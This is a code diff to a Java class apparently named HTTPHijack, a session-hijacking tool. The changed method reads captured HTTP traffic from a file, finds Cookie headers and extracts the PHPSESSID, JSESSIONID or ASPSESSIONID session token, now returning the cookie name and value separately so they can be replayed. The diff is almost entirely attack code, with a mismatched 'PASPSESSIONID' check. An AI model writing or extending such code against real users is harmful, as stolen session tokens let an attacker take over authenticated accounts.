@@ -104,7 +104,7 @@ public class HTTPHijack {
     }
 
     private static String[] StripData(){
-        String[] output = new String[2];
+        String[] output = new String[3];
         BufferedReader reader;
         try {
             reader = new BufferedReader(new FileReader("DataOutput.txt"));
@@ -120,19 +120,24 @@ public class HTTPHijack {
                     String cookie = line.substring(8);//JSESSIONID (Java EE), PHPSESSID (PHP), and ASPSESSIONID (Microsoft ASP).
                     if(cookie.contains("PHPSESSID")){
                         cookie = cookie.substring(cookie.indexOf("PHPSESSID"));
+                        output[1] = "PHPSESSID";
                         containsSession = true;
                     } else if(cookie.contains("JSESSIONID")){
                         cookie = cookie.substring(cookie.indexOf("JSESSIONID"));
+                        output[1] = "JSESSIONID";
                         containsSession = true;
                     } else if(cookie.contains("PASPSESSIONID")){
                         cookie = cookie.substring(cookie.indexOf("ASPSESSIONID"));
+                        output[1] = "ASPSESSIONID";
                         containsSession = true;
                     }
-                    if(cookie.contains(" ")){
-                        cookie = cookie.substring(0, cookie.indexOf(" "));
-                    }
                     if(containsSession) {
-                        output[1] = cookie;
+                        if (cookie.contains(";")) {
+                            cookie = cookie.substring(cookie.indexOf("=") + 1, cookie.indexOf(";"));
+                        } else {
+                            cookie = cookie.substring(cookie.indexOf("=") + 1);
+                        }
+                        output[2] = cookie;
                         return output;
                     }
                 }
